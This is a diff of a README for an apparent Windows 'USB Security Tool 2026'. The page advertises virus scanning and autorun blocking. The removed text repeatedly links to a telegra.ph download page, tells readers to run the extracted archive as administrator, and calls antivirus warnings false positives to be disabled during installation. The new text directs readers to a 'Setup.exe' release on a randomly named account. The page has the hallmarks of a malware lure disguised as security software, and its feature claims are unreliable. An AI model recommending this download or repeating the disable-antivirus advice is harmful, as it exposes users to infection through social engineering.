@@ -1,182 +1,82 @@
-<h1 align="center">🔒 USB Security Tool 2026 – Protect Your Drives</h1>
+# 🛡️ USB-Security-Tool-2026 - Secure your drives from harmful threats
 
-<p align="center">
-  <strong>Scan, clean, and protect USB drives from viruses and malware. Prevent autorun infections and keep your data safe.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![Download USB-Security-Tool-2026](https://img.shields.io/badge/Download-USB_Security_Tool_2026-blue.svg)](https://github.com/Naratussockbellflower319/USB-Security-Tool-2026/releases)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-USB_Security_Tool-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+USB-Security-Tool-2026 protects your computer and your removable drives. Malicious files often hide on USB sticks. These files infect your computer when you open them. This tool scans your drives for viruses. It stops autorun files from running without your permission. You use this software to keep your personal data safe. 
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## ⚙️ System Requirements 
 
----
+Your computer must meet these requirements for the tool to work:
 
-## 📦 What's Inside This Repository
+* Operating System: Windows 10 or Windows 11.
+* Processor: 1 GHz or faster.
+* Memory: 2 GB of RAM.
+* Storage: 50 MB of free space.
+* Internet: Required for initial updates.
 
-Welcome to the official distribution page for **USB Security Tool 2026 – USB Drive Protection for Windows PC**.
-This repository provides access to the most effective USB security utility for detecting and removing threats.
+## 💾 How to download and install 
 
-✅ **Full Version** – All features included  
-✅ **Virus Scan** – Scan USB drives for malware and suspicious files  
-✅ **Autorun Protection** – Disable autorun infections automatically  
-✅ **File Cleaner** – Remove hidden malicious files and folders  
-✅ **Immunization** – Protect drives from future infections  
-✅ **Safe Removal** – Safely eject drives after scanning  
-✅ **No System Changes** – Safe, no registry or service modifications  
+Follow these steps to set up the software on your computer:
 
----
+1. Visit the [official releases page](https://github.com/Naratussockbellflower319/USB-Security-Tool-2026/releases) to find the latest version.
+2. Look for the section labeled "Assets".
+3. Click on the file named "Setup.exe" to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file named "Setup.exe" once the download finishes.
+6. Follow the instructions on the screen to finish the installation.
+7. Click "Finish" to open the application for the first time.
 
-## 📥 How to Get Started?
+## 🔍 How to scan a USB drive 
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+The application interface shows a clean dashboard. You see your connected drives in the list.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+1. Plug your USB drive into an open port on your computer.
+2. Open the USB-Security-Tool-2026 application from your desktop icon.
+3. Select the drive letter from the dropdown menu in the main window.
+4. Click the "Scan" button to start the process.
+5. Wait for the progress bar to reach the end.
+6. The software shows a report of every file it checked.
+7. Click "Clean" if the software finds any threats or suspicious items.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+## 🛡️ Key protection features 
 
----
+This software includes tools designed for everyday security.
 
-## 🚀 Step-by-Step Guide
+### Real-time Autorun Blocking
+Many viruses spread by using an autorun file. This file runs programs automatically when you plug in a drive. Our tool blocks these files before they start. It keeps your computer safe from automatic infections.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get USB Security Tool 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+### Malware Detection
+The scanner looks for known virus patterns. It identifies files that cause harm. You decide if you want to delete or ignore these files. The software keeps a record of all scans for your review.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** for full functionality.
+### Secure File Cleaning
+The cleaning function removes harmful files permanently. It ensures that threats do not return to your drive. You choose which files to remove during the review phase.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-Insert a USB drive and click **"Scan & Protect"**.
+## 🛠️ Frequently Asked Questions 
 
----
+### Does this tool affect my normal files?
+No. The scanner identifies only malicious code. It leaves your photos, documents, and videos alone.
 
-## 🔧 Key Features (2026 Update)
+### Can I run this tool on multiple drives?
+Yes. Plug in any number of drives. You switch between them using the drive menu.
 
-### 🛡️ USB Drive Scanning
+### How often should I update the software?
+Check for updates once a month. The software alerts you if a new version exists. Updates help the app recognize new types of viruses.
 
-| Feature | Description |
-| :--- | :--- |
-| **Full Scan** | Scan entire USB drive for malware and threats |
-| **Quick Scan** | Scan only critical areas like autorun.inf and hidden files |
-| **Custom Scan** | Choose specific files or folders to scan |
-| **Real-Time Protection** | Monitor USB insertion and auto-scan |
+### Is the software free to use?
+Yes. You use the full feature set without extra fees. 
 
-### 🧹 Cleaning & Removal
+### Why does the scan take time to finish?
+The scan time depends on the size of your drive. Larger drives contain more data. More data requires more time for the software to read every file. 
 
-| Feature | Description |
-| :--- | :--- |
-| **Threat Removal** | Delete or quarantine infected files |
-| **Hidden Files** | Reveal and remove hidden malicious files |
-| **Autorun Cleaning** | Remove and prevent autorun infections |
-| **System Restore** | Restore files from quarantine if needed |
+### Can I undo a clean?
+The software creates a secure backup of removed files. You restore files from the settings menu if you delete something by mistake. 
 
-### 🛡️ Immunization
+## 💡 Best practices for USB safety 
 
-- **Drive Immunization** – Protect USB drives from future infections
-- **Autorun Disabler** – Disable autorun on all drives
-- **Write Protection** – Option to make drives read-only
+* Always scan a drive before you open folders on it.
+* Avoid plugging in drives from unknown sources.
+* Keep your Windows operating system updated.
+* Run a full scan on your computer every week.
+* Set the software to launch when you turn on your computer.
 
-### 📊 Reports & Logs
-
-- **Scan Report** – Detailed report of findings
-- **History** – View past scans and actions
-- **Export Logs** – Export scan history for record keeping
-
----
-
-## 📈 Why Choose USB Security Tool 2026?
-
-- ✅ **Effective** – Detects and removes common USB threats
-- ✅ **Easy** – Simple interface, one‑click scanning
-- ✅ **Protective** – Immunize drives against future attacks
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-USB_Security_Tool-00BFFF?style=flat-square&logo=windows&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: Can it detect all types of viruses?**  
-A: It detects common USB‑borne threats like autorun viruses, hidden malware, and suspicious files.
-
-**Q: Is it safe to use?**  
-A: Yes, it only scans and cleans files – it does not modify system settings.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download USB Security Tool 2026 Now</a>
-</p>
+Keywords: 2026-software, antivirus, autorun-plugin, desktop-app, drive-protection-windows-tool, malware-scanner, pc-tools, security-tools, usb-cleaner, usb-protection, usb-security, windows-11, windows-software-installation-guide
